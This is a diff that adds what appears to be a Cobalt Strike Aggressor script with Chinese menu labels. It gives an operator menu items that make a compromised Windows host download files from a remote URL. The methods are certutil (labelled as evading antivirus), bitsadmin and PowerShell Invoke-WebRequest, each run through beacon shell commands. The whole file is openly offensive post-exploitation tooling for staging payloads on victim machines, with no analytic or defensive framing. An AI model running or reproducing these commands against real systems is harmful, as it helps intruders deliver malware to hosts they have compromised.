@@ -1,0 +1,44 @@
+menu "远程文件下载" {
+	item "certutil(绕AV)" {
+		$bid = $1['@'];
+		$dialog = dialog("远程下载文件", %(url => "http://192.168.10.1/test.exe", path => "", bid => $bid), &certutil);
+		dialog_description($dialog, "使用certutil远程下载文件到指定目录");
+		drow_text($dialog, "url", "远程URL:  ");
+		drow_text($dialog, "path", "路径:  ");
+		dbutton_action($dialog, "确定");
+		dialog_show($dialog);
+	}
+	sub certutil {
+		blog($bid, "-------------------------------------------------------------使用certutil远程下载文件到指定目录-------------------------------------------------------------");
+		bshell($bid, "certutils");
+		bshell($bid, "certutil -urlcache -split -f $3['url']  $3['path']");
+	}
+	item "bitsadmin" {
+		$bid = $1['@'];
+		$dialog = dialog("远程下载文件", %(url => "http://192.168.10.1/test.exe", path => "", bid => $bid), &bitsadmin);
+		dialog_description($dialog, "使用bitsadmin远程下载文件到指定目录");
+		drow_text($dialog, "url", "远程URL:  ");
+		drow_text($dialog, "path", "路径:  ");
+		dbutton_action($dialog, "确定");
+		dialog_show($dialog);
+	}
+	sub bitsadmin {
+		blog($bid, "-------------------------------------------------------------使用bitsadmin远程下载文件到指定目录-------------------------------------------------------------");
+		bshell($bid, "bitsadmin");
+		bshell($bid, "start bitsadmin /transfer test $3['url']  $3['path']");
+		bshell($bid, "bitsadmin /setpriority test foreground");
+	}
+	item "iwr(win10)" {
+		$bid = $1['@'];
+		$dialog = dialog("远程下载文件", %(url => "http://192.168.10.1/test.exe", path => "", bid => $bid), &iwr);
+		dialog_description($dialog, "使用iwr远程下载文件到指定目录");
+		drow_text($dialog, "url", "远程URL:  ");
+		drow_text($dialog, "path", "路径:  ");
+		dbutton_action($dialog, "确定");
+		dialog_show($dialog);
+	}
+	sub iwr {
+		blog($bid, "-------------------------------------------------------------使用iwr远程下载文件到指定目录-------------------------------------------------------------");
+		bshell($bid, "powershell iwr -Uri $3['url'] -OutFile $3['path'] -UseBasicParsing");
+	}
+}
